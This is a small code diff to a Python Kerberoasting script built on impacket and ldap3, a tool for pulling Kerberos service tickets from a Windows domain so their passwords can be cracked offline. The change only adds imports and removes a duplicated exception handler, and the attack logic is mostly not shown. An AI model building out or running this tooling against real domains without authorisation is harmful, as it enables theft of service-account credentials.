@@ -1,4 +1,4 @@
-from impacket.krb5.types import Principal
+from impacket.krb5.types import Principal, KerberosTime, Ticket
 from impacket.smbconnection import SMBConnection
 from ldap3 import Server, Connection, SUBTREE
 from impacket.krb5.ccache import CCache
@@ -7,6 +7,8 @@ from impacket.krb5.kerberosv5 import getKerberosTGT, sendReceive, sendReceiveSin
 from impacket.krb5.types import Principal, KerberosTime
 from impacket.ntlm import compute_lmhash, compute_nthash
 from impacket.smbconnection import SMBConnection
+from impacket.krb5.asn1 import AP_REQ
+from impacket.krb5.crypto import Key
 
 def kerberoast(username, password, domain, dc_ip):
     try:
@@ -50,11 +52,7 @@ def kerberoast_user(spn, domain):
 
         # Return the Kerberoast ticket
         return kerberoast_ticket
-
-    except Exception as e:
-        print(f"Error during Kerberoasting for user {spn}: {e}")
-        return None
-
+    
     except Exception as e:
         print(f"Error during Kerberoasting for user {spn}: {e}")
         return None
